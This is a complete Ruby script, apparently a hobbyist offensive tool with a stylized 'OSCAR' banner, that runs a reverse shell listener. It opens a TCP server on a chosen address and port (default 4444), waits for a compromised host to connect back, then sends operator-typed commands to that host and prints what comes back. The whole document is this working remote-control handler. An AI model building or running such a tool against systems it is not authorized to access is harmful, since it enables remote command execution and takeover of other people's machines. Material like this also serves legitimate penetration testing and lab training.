#!/usr/bin/env ruby
# -*- coding: utf-8 -*-

require 'socket'
require 'timeout'
require 'io/console'


module Colors
  RED = "\033[91m"
  YELLOW = "\033[93m"
  WHITE = "\033[97m"
  RESET = "\033[0m"
  BOLD = "\033[1m"
end


def oscar_banner
  system('clear') || system('cls')
  
  banner = """
#{Colors::RED}
    ▒█████       ██████     ▄████▄      ▄▄▄          ██▀███   
  ▒██▒  ██▒   ▒██    ▒    ▒██▀ ▀█     ▒████▄       ▓██ ▒ ██▒
  ▒██░  ██▒   ░ ▓██▄      ▒▓█    ▄    ▒██  ▀█▄     ▓██ ░▄█ ▒
  ▒██   ██░     ▒   ██▒   ▒▓▓▄ ▄██▒   ░██▄▄▄▄██    ▒██▀▀█▄        
  ░ ████▓▒░   ▒██████▒▒   ▒ ▓███▀ ░    ▓█   ▓██▒   ░██▓ ▒██▒
  ░ ▒░▒░▒░    ▒ ▒▓▒ ▒ ░   ░ ░▒ ▒  ░    ▒▒   ▓▒█░   ░ ▒▓ ░▒▓░      By Abraham ...
    ░ ▒ ▒░    ░ ░▒  ░ ░     ░  ▒        ▒   ▒▒ ░     ░▒ ░ ▒░
  ░ ░ ░ ▒     ░  ░  ░     ░             ░   ▒        ░░   ░ 
      ░ ░           ░     ░ ░               ░  ░      ░     
                          ░                                 
#{Colors::RESET}
"""
  puts banner
end


class ReverseShellListener
  attr_reader :host, :port, :socket, :client, :client_addr, :running

  def initialize(host = '0.0.0.0', port = 4444)
    @host = host
    @port = port
    @socket = nil
    @client = nil
    @client_addr = nil
    @running = true
  end

  def start
    oscar_banner

    begin
      @socket = TCPServer.new(@host, @port)
      @socket.setsockopt(Socket::SOL_SOCKET, Socket::SO_REUSEADDR, true)

      puts "#{Colors::WHITE}[#{Colors::RED}+#{Colors::WHITE}] LISTENING ON #{Colors::YELLOW}#{@host}:#{@port}"
      puts "#{Colors::WHITE}[#{Colors::YELLOW}*#{Colors::WHITE}] AWAITING INCOMING CONNECTION..."
      puts

      @client = @socket.accept
      @client_addr = @client.peeraddr

      puts "#{Colors::WHITE}[#{Colors::RED}+#{Colors::WHITE}] CONNECTION ESTABLISHED"
      puts "#{Colors::WHITE}    FROM #{Colors::YELLOW}#{@client_addr[3]}#{Colors::WHITE} ON PORT #{Colors::YELLOW}#{@client_addr[1]}"
      puts

      shell_session

    rescue Interrupt
      puts "\n#{Colors::WHITE}[#{Colors::YELLOW}!#{Colors::WHITE}] INTERRUPTED BY USER"
    rescue Errno::EADDRINUSE
      puts "#{Colors::WHITE}[#{Colors::RED}-#{Colors::WHITE}] PORT #{@port} IS ALREADY IN USE"
    rescue => e
      puts "#{Colors::WHITE}[#{Colors::RED}-#{Colors::WHITE}] ERROR: #{e.message}"
    ensure
      cleanup
    end
  end

  def shell_session
    puts "#{Colors::WHITE}[#{Colors::YELLOW}*#{Colors::WHITE}] SHELL SESSION ACTIVE"
    puts "#{Colors::WHITE}[#{Colors::YELLOW}*#{Colors::WHITE}] TYPE '#{Colors::RED}exit#{Colors::WHITE}' TO TERMINATE"
    puts

    while @running
      begin
        prompt = "#{Colors::RED}┌─#{Colors::WHITE}shell#{Colors::RED}@#{Colors::YELLOW}#{@client_addr[3]}#{Colors::RED}\n└─#{Colors::WHITE}$ #{Colors::RESET}"
        print prompt
        cmd = gets.chomp

        if cmd.nil?
          break
        end

        if cmd.empty?
          next
        end

        if cmd.downcase == 'exit' || cmd.downcase == 'quit'
          puts "#{Colors::WHITE}[#{Colors::YELLOW}*#{Colors::WHITE}] CLOSING CONNECTION..."
          break
        end

        if cmd.downcase == 'clear'
          system('clear') || system('cls')
          oscar_banner
          next
        end

        @client.puts(cmd)

        output = receive_output
        if output && !output.empty?
          print output
        else
          puts "#{Colors::WHITE}[#{Colors::YELLOW}!#{Colors::WHITE}] NO OUTPUT RECEIVED"
        end

      rescue Interrupt
        puts "\n#{Colors::WHITE}[#{Colors::YELLOW}!#{Colors::WHITE}] INTERRUPTED"
        break
      rescue Errno::EPIPE, IOError
        puts "#{Colors::WHITE}[#{Colors::RED}-#{Colors::WHITE}] CONNECTION LOST"
        break
      rescue => e
        puts "#{Colors::WHITE}[#{Colors::RED}-#{Colors::WHITE}] ERROR: #{e.message}"
        break
      end
    end
  end

  def receive_output
    output = ""
    begin
      Timeout.timeout(1) do
        loop do
          begin
            data = @client.recv(4096)
            break if data.nil? || data.empty?
            output << data
          rescue IO::EAGAINWaitReadable, IO::EWOULDBLOCKWaitReadable
            sleep(0.01)
            break if output.length > 0
          rescue
            break
          end
        end
      end
    rescue Timeout::Error
      # Timeout is expected
    rescue
      # Ignore other errors
    end
    output
  end

  def cleanup
    puts "#{Colors::WHITE}[#{Colors::YELLOW}*#{Colors::WHITE}] CLEANING UP..."

    begin
      @client.close if @client
    rescue
      # Ignore
    end

    begin
      @socket.close if @socket
    rescue
      # Ignore
    end

    puts "#{Colors::WHITE}[#{Colors::RED}+#{Colors::WHITE}] CLEANUP COMPLETE"
  end
end


def main
  if ARGV.length < 1
    puts "#{Colors::RED}USAGE: #{$0} <IP> <PORT>"
    puts "#{Colors::WHITE}EXAMPLE: #{$0} 0.0.0.0 4444"
    puts
    puts "#{Colors::WHITE}OR WITH DEFAULTS:"
    puts "  #{$0} --default"
    exit 1
  end

  if ARGV[0] == '--default'
    host = '0.0.0.0'
    port = 4444
  else
    if ARGV.length < 2
      puts "#{Colors::WHITE}[#{Colors::RED}-#{Colors::WHITE}] SPECIFY BOTH IP AND PORT"
      exit 1
    end
    host = ARGV[0]
    port = ARGV[1].to_i
  end

  listener = ReverseShellListener.new(host, port)
  listener.start
end


if __FILE__ == $0
  main
end